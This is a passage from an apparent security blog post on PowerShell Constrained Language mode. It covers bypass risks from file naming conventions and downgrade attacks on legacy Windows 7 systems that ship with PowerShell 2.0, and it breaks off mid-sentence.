In addition, there are also file naming conventions that enable FullLanguage mode on a script, effectively bypassing Constrained Language.\n\nIt must be emphasized that administrators should **NOT** deploy this to their endpoints as a way to enable Constrained Language mode - and be extra mindful when reading through articles regarding security features.\n\n\u003cbr\u003e\n\n### Compatibility with Legacy OSs\n\nAnother thing to consider before rolling this feature out to endpoints is legacy OSs. As mentioned at the beginning of this post, Constrained Language mode is only available on PowerShell 3.0 onwards - and Windows 7 ships with PowerShell 2.0 by default.\n\n![202101-8.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230074/202101_8_6103f884e7.png)\n\nWhile it is possible to install WMF 5.1 on older systems such as Windows 7, these systems likely ship with PowerShell 2.0 as its core component as well, which is susceptible to *downgrade attacks*.\n\nAll the attacker ne
